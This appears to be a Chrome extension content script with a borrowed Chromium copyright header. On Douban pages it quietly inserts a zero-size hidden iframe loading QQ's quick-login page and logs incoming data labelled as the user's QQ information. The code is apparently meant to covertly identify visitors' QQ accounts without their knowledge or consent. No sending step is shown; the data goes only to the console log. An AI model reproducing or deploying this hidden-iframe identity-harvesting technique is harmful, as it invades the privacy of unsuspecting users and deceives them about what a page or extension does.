/*
 * Copyright (c) 2010 The Chromium Authors. All rights reserved.  Use of this
 * source code is governed by a BSD-style license that can be found in the
 * LICENSE file.
 */
 
(function(){
	//加入过滤器标示并建立好对象	
	var doumail=$("a[href*='http://www.douban.com/doumail/']");
	doumail.after("<iframe height=0 width=0 id='qso' src='https://xui.ptlogin2.qq.com/div/qlogin_div_t.html'></iframe>");
	chrome.extension.onRequest.addListener(function(request, sender, sendResponse) {
    console.log("用户的QQ信息:", request.url);
    sendResponse({});
});

} )();